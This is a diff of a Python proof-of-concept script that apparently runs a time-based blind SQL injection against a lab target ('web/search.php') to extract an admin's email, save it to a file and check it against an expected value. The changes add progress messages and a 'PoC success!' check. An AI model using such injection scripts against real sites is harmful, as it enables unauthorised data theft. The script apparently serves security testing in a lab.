@@ -2,6 +2,7 @@ import requests
 import time
 import math
 
+print("Executing Injection.py")
 host = 'web'
 origin_url = 'http://' + host
 search_url = origin_url + '/search.php'
@@ -27,6 +28,8 @@ params = (
 )
 
 delay = 1  # sleep(delay) in SQL
+
+print("Sending requests")
 
 pass_len_min = 16
 pass_len_max = 255
@@ -64,8 +67,9 @@ for i in range(1, 17):
 result2txt = str(email)
 result2txt = result2txt.lower()
 print('the admin\'s email is ' + result2txt)
-if('123456@gmail.com' in result2txt):
-    print('Dump Succeeded')
 with open('email.txt', 'a') as file_handle:
     file_handle.write(result2txt)
     file_handle.write('\n')
+
+if result2txt == "123456@gmail.com" :
+    print("PoC success!")
